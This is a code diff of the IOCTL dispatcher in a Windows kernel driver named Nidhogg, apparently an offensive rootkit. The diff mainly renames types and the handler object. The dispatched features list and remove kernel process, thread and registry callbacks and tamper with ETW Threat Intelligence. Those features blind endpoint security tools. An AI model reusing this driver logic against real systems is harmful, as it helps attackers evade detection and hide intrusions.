@@ -991,13 +991,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ObCallbacksList))) {
+		if (!IsValidSize(size, sizeof(IoctlCallbackList<ObCallback>))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<ObCallbacksList*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlCallbackList<ObCallback>*>(Irp->AssociatedIrp.SystemBuffer);
 
-		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
+		if (data->Count == 0 && data->Callbacks) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -1005,7 +1005,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (data->Type) {
 		case ObProcessType:
 		case ObThreadType: {
-			status = NidhoggAntiAnalysis->ListObCallbacks(data);
+			status = NidhoggAntiAnalysisHandler->ListObCallbacks(data);
 			break;
 		}
 		default:
@@ -1020,13 +1020,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(PsRoutinesList))) {
+		if (!IsValidSize(size, sizeof(IoctlCallbackList<PsRoutine>))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<PsRoutinesList*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlCallbackList<PsRoutine>*>(Irp->AssociatedIrp.SystemBuffer);
 
-		if (!data->Routines) {
+		if (!data->Callbacks) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -1037,7 +1037,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		case PsCreateProcessType:
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread: {
-			status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
+			status = NidhoggAntiAnalysisHandler->ListPsNotifyRoutines(data);
 			break;
 		}
 		default:
@@ -1051,17 +1051,17 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(CmCallbacksList))) {
+		if (!IsValidSize(size, sizeof(IoctlCallbackList<CmCallback>))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<CmCallbacksList*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlCallbackList<CmCallback>*>(Irp->AssociatedIrp.SystemBuffer);
 
 		if (!data->Callbacks) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);
+		status = NidhoggAntiAnalysisHandler->ListRegistryCallbacks(data);
 
 		len += size;
 		break;
@@ -1069,18 +1069,22 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_REMOVE_RESTORE_CALLBACK:
 	{
+		IoctlKernelCallback callbackInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(KernelCallback))) {
+		if (!IsValidSize(size, sizeof(IoctlKernelCallback))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<KernelCallback*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlKernelCallback*>(Irp->AssociatedIrp.SystemBuffer);
 
 		if (!VALID_KERNELMODE_MEMORY(data->CallbackAddress)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
+		callbackInfo.CallbackAddress = data->CallbackAddress;
+		callbackInfo.Type = data->Type;
+		callbackInfo.Remove = data->Remove;
 
 		if (data->Remove) {
 			switch (data->Type) {
@@ -1092,7 +1096,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			case ObProcessType:
 			case ObThreadType:
 			case CmRegistryType: {
-				status = NidhoggAntiAnalysis->RemoveCallback(data);
+				status = NidhoggAntiAnalysisHandler->ReplaceCallback(callbackInfo);
 				break;
 			}
 			default:
@@ -1111,7 +1115,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			case ObProcessType:
 			case ObThreadType:
 			case CmRegistryType: {
-				status = NidhoggAntiAnalysis->RestoreCallback(data);
+				status = NidhoggAntiAnalysisHandler->RestoreCallback(callbackInfo);
 				break;
 			}
 			default:
@@ -1144,7 +1148,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 		auto data = static_cast<bool*>(Irp->AssociatedIrp.SystemBuffer);
 		enable = *data;
-		status = NidhoggAntiAnalysis->EnableDisableEtwTI(enable);
+		status = NidhoggAntiAnalysisHandler->EnableDisableEtwTI(enable);
 
 		if (!NT_SUCCESS(status))
 			Print(DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status);
